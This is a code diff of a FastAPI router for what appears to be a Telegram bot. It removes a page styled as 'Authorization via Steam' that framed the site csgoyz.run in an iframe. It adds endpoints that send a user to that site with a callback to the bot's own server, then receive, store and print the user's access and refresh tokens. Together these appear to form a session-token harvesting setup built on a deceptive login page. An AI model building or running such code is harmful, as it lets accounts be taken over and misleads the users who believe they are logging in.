@@ -1,50 +1,30 @@
-from fastapi import APIRouter, Request, Query, HTTPException
-from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
-import urllib.parse
+from fastapi import APIRouter, Request
+from fastapi.responses import RedirectResponse, JSONResponse
 
 router = APIRouter()
-@router.get("/portal")
-async def portal(chat_id: int):
-    return HTMLResponse(f"""
-<!DOCTYPE html>
-<html>
-<head>
-<title>Авторизация</title>
-<style>
-body {{
-    margin: 0;
-    background: #0f1117;
-    color: white;
-    font-family: Arial;
-}}
-#shell {{
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-}}
-#top {{
-    padding: 12px;
-    background: #151821;
-    border-bottom: 1px solid #222;
-}}
-#frame {{
-    flex: 1;
-    border: none;
-    width: 100%;
-}}
-</style>
-</head>
-<body>
-<div id="shell">
-  <div id="top">🔐 Авторизация через Steam</div>
-  <iframe id="frame"></iframe>
-</div>
 
-<script>
-const target = "https://csgoyz.run";   // или любой другой сайт
-const frame = document.getElementById("frame");
-frame.src = target;
-</script>
-</body>
-</html>
-""")
+SELF = "https://tg-bot-test-gkbp.onrender.com"
+
+RAM_DATA = {}
+
+# 1️⃣ старт авторизации
+@router.get("/auth/start")
+async def auth_start(chat_id: int):
+    redirect = (
+        "https://csgoyz.run/?"
+        f"tg_callback={SELF}/auth/receive?chat_id={chat_id}"
+    )
+    return RedirectResponse(redirect)
+
+
+# 2️⃣ приём токенов
+@router.post("/auth/receive")
+async def auth_receive(request: Request, chat_id: int):
+    data = await request.json()
+
+    RAM_DATA.setdefault(chat_id, {})
+    RAM_DATA[chat_id]["access"] = data["token"]
+    RAM_DATA[chat_id]["refresh"] = data["refresh"]
+
+    print("🔥 TOKENS:", chat_id, RAM_DATA[chat_id])
+    return JSONResponse({"ok": True})
